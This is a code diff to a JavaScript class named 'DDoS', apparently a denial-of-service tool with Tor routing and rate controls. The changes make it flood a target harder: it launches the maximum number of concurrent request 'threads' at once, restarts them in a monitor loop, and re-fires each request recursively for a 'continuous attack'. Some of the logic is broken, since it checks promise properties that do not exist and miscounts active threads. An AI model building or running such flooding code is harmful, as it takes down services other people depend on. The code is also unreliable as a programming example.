@@ -26,6 +26,8 @@ class DDoS {
   this.requestRateSliderInput = this.requestRateSlider.querySelector('input');
   this.requestRateSliderValue = this.requestRateSlider.querySelector('.noodle-slider-value');
   this.torToggleInput = this.torToggle.querySelector('input');
+
+  this.attackThreads = []; // Array to store attack thread promises
  }
 
  initializeValues() {
@@ -566,34 +568,40 @@ class DDoS {
   this.packetsSent = 0;
   this.dataSent = 0;
   this.errors = 0;
+  this.activeThreads = 0; // Reset active threads count
 
+  this.attackThreads = []; // Clear any existing threads
 
-  const attackLoop = async () => {
-   if (!this.running) {
-    this.connectionStatus = 'Idle';
-    return;
+  for (let i = 0; i < this.maxThreads; i++) {
+   const threadPromise = this.sendDDoSRequest(target);
+   this.attackThreads.push(threadPromise);
+   this.activeThreads++;
+  }
+
+  // Monitor threads and restart if they fail (basic fault tolerance)
+  this.monitorThreads(target);
+ }
+
+ async monitorThreads(target) {
+  while (this.running) {
+   // Check if any threads have finished (either resolved or rejected)
+   const finishedThreads = this.attackThreads.filter(promise => promise.isResolved || promise.isRejected);
+
+   // Restart finished threads
+   for (const finishedThread of finishedThreads) {
+    const index = this.attackThreads.indexOf(finishedThread);
+    if (index > -1) {
+     this.attackThreads.splice(index, 1); // Remove finished thread
+
+     // Create and push a new thread
+     const newThreadPromise = this.sendDDoSRequest(target);
+     this.attackThreads.push(newThreadPromise);
+    }
+    this.activeThreads = this.attackThreads.length;
+
    }
 
-   if (this.activeThreads < this.maxThreads) {
-    this.activeThreads++;
-    this.sendDDoSRequest(target)
-     .finally(() => {
-      this.activeThreads--;
-      if (this.running) {
-       attackLoop();
-      } else {
-       this.connectionStatus = 'Idle';
-      }
-     });
-   } else {
-    await new Promise(resolve => setTimeout(resolve, 10));
-    attackLoop();
-   }
-  };
-
-  const initialThreads = Math.min(10, this.maxThreads / 10);
-  for (let i = 0; i < initialThreads; i++) {
-   attackLoop();
+   await new Promise(resolve => setTimeout(resolve, 5000)); // Check every 5 seconds
   }
  }
 
@@ -610,9 +618,17 @@ class DDoS {
    this.packetsSent++;
    this.dataSent += data.message.length;
 
-   this.mbps = this.dataSent / (Date.now() - this.attackStartTime) * 8 / 1000000
+   this.mbps = this.dataSent / (Date.now() - this.attackStartTime) * 8 / 1000000;
   } catch (err) {
    this.handleAttackError('DDoS', target, err);
+  } finally {
+   if (this.running) {
+    // Immediately start a new request if still running
+    this.sendDDoSRequest(target); // Recursive call for continuous attack
+   } else {
+    this.activeThreads--;
+
+   }
   }
  }
 
@@ -878,6 +894,9 @@ class DDoS {
   this.stopButton.disabled = true;
   this.attackStartTime = null;
   this.activeThreads = 0;
+  this.mbps = 0;
+  this.packetsSent = 0;
+  this.dataSent = 0;
  }
 
  setAttackType(attackType) {
